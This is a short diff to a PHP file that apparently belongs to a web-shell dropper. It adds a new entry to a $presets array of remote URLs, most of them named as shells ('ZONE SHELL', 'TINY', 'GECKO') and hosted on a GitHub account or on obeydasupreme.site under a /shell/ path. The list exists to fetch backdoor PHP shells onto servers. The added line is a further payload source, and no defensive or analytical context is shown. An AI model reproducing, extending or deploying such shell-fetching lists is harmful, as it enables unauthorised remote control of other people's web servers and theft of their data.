@@ -85,6 +85,7 @@ $presets = [
     'LOOSER' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/looser1.txt',
     'LOOSER 2' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/looser2.txt',
     'ZONE SHELL' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/1.php',
+    'FMOBS' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/OBSNEWSHELLL.txt',
     'TINY' => 'https://obeydasupreme.site/shell/obstiny.txt',
     'GECKO' => 'https://obeydasupreme.site/shell/obsgecko.txt',
     'KOD EXPLORE' => 'https://github.com/kalcaddle/KODExplorer/archive/master.zip',
